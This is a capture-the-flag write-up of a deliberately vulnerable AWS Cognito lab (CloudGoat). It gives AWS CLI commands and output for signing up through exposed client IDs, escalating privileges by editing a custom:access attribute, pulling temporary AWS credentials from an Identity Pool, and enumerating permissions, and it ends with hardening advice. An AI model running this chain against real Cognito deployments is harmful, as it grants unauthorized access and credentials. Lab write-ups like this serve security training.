# 🛠️ CloudGoat vulnerable Cognito Writeup

## ⚡ TL;DR

We exploit a misconfigured AWS Cognito environment by signing up through a vulnerable User Pool, retrieving an access token, and leveraging it to escalate privileges via custom attributes. This access allows us to assume roles in an Identity Pool and retrieve temporary AWS credentials—facilitating lateral movement or privilege escalation within the environment.

---

## 🎯 Target Information

- **Region**: `us-east-1`
- **Cognito Identity Pool ID**: `us-east-1:a96c9f79-324c-c9d1-3de8-ec55221338c8`
- **Cognito App Client ID**: `24m03titp7v5d0eli306vqimto`  
- **Cognito User Pool ID**: `us-east-1_mSaMI1nQ1`

---

## 🧽 Step-by-Step Exploitation

### 🔍 Step 1: Reconnaissance & Initial Access

The application is hosted at:

```
https://xxx.execute-api.us-east-1.amazonaws.com/vulncognito/cognitoctf-cgid730b6h5u8m/index.html
```

Upon visiting the site, we find login and sign-up functionality. Attempting to sign up reveals a filter: only emails ending in `@ecorp.com` are accepted.

![image](https://github.com/user-attachments/assets/3b46f796-feb5-4178-aaa2-93e161c5e2e3)

Trying to sign up:

![image (1)](https://github.com/user-attachments/assets/c04436b5-742f-4b4a-8b58-0e3c08800bf9)

Inspecting the page source, we find credentials hardcoded in JavaScript:

```js
UserPoolId: 'us-east-1_mSaMI1nQ1',
ClientId: '24m03titp7v5d0eli306vqimto',
```

This gives us what we need to begin interacting with AWS Cognito via CLI.

---

### ✉️ Step 2: User Registration via AWS CLI

Using the `ClientId`, we attempt to register:

```bash
aws cognito-idp sign-up \
  --client-id 24m03titp7v5d0eli306vqimto \
  --username test@test.com \
  --password 'Test1@test.com' \
  --user-attributes Name=email,Value=test@test.com Name=given_name,Value=test Name=family_name,Value=test
```

Response:

```json
{
  "UserConfirmed": false,
  "CodeDeliveryDetails": {
    "Destination": "t***@t***",
    "DeliveryMedium": "EMAIL",
    "AttributeName": "email"
  },
  "UserSub": "d4a84488-c001-705a-8fb9-164a987e4a4e"
}
```

We confirm the user:

```bash
aws cognito-idp confirm-sign-up \
  --client-id 24m03titp7v5d0eli306vqimto \
  --username test@test.com \
  --confirmation-code <CODE_FROM_EMAIL>
```

---

### 🧰 Step 3: Authentication & Access Token Retrieval

Login now redirects us to a new page:

![image (2)](https://github.com/user-attachments/assets/0bde252f-7b19-4e5e-a3cd-1524122c12d2)

We use **Burp Suite** to intercept the login and capture our **access token**.

![cognito](https://github.com/user-attachments/assets/c5952bd1-b17a-40d1-97cb-655119f81765)


We validate the token via:

```bash
aws cognito-idp get-user --access-token <ACCESS_TOKEN>
```

Which reveals:

```json
"custom:access": "reader"
```

This custom attribute seems to control access levels.

---

### ⬆️ Step 4: Privilege Escalation via Attribute Modification

We attempt to elevate our privileges by modifying the `custom:access` attribute:

```bash
aws cognito-idp update-user-attributes \
  --access-token <ACCESS_TOKEN> \
  --user-attributes '[{"Name":"custom:access","Value":"admin"}]'
```

The update is successful. We now potentially have admin-level access.

---

### 🧺 Step 5: Linking to Identity Pool

With elevated privileges, we now attempt to get temporary AWS credentials by linking the token to the Cognito Identity Pool:

```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id us-east-1:a96c9f79-324c-c9d1-3de8-ec55221338c8 \
  --logins '{"cognito-idp.us-east-1.amazonaws.com/us-east-1_mSaMI1nQ1":"<ACCESS_TOKEN>"}'
```

Returns:

```json
"IdentityId": "us-east-1:a96c9f79-324c-c9d1-3de8-ec55221338c8"
```

Now we request credentials:

```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id us-east-1:a96c9f79-324c-c9d1-3de8-ec55221338c8 \
  --logins '{"cognito-idp.us-east-1.amazonaws.com/us-east-1_mSaMI1nQ1":"<ACCESS_TOKEN>"}'
```

We receive:

```json
"AccessKeyId": "ASIA...",
"SecretKey": "xxxxx",
"SessionToken": "xxxxx",
"Expiration": "2025-06-04T21:43:26-04:00"
```

---

### 🧰 Step 6: Configure and Verify Access

We configure a new AWS CLI profile with our credentials:

```bash
aws configure --profile cognito
```

Then verify access:

```bash
aws sts get-caller-identity --profile cognito
```

Output:

```json
{
  "UserId": "AROA2S3E7PEZIU2AWMXNC:CognitoIdentityCredentials",
  "Account": "727671863602",
  "Arn": "arn:aws:sts::727671863602:assumed-role/cognito_authenticated-cgid730b6h5u8m/CognitoIdentityCredentials"
}
```

---

### 🔎 Step 7: Enumerating Permissions with Pacu

We use [Pacu](https://github.com/RhinoSecurityLabs/pacu) to discover the permissions tied to the assumed role:

```json
"Permissions": {
  "Allow": [
    "sts:GetCallerIdentity",
    "dynamodb:DescribeEndpoints",
    "lambda:ListFunctions",
    "lambda:ListEventSourceMappings",
    "lambda:ListLayers",
    "lambda:GetAccountSettings",
    "s3:ListBuckets"
  ],
  "Deny": []
}
```

While limited, these permissions still provide actionable access to several services including **Lambda**, **S3**, and **DynamoDB**.

---

## 🧠 Key Takeaways

- **Client IDs and User Pool IDs** hardcoded in frontend JavaScript are a major security risk.
- **Attribute update policies** must be tightly controlled—especially for custom fields like `custom:access`.
- **Identity Pool trust relationships** should strictly validate user claims and access levels.

---

## 🐻 Conclusion

This exploitation chain demonstrates how seemingly benign AWS Cognito misconfigurations can lead to privilege escalation, credential exposure, and lateral movement across an AWS account. Secure your Cognito implementation by:

- Removing sensitive config from frontend apps
- Restricting attribute updates
- Locking down identity pool trust policies
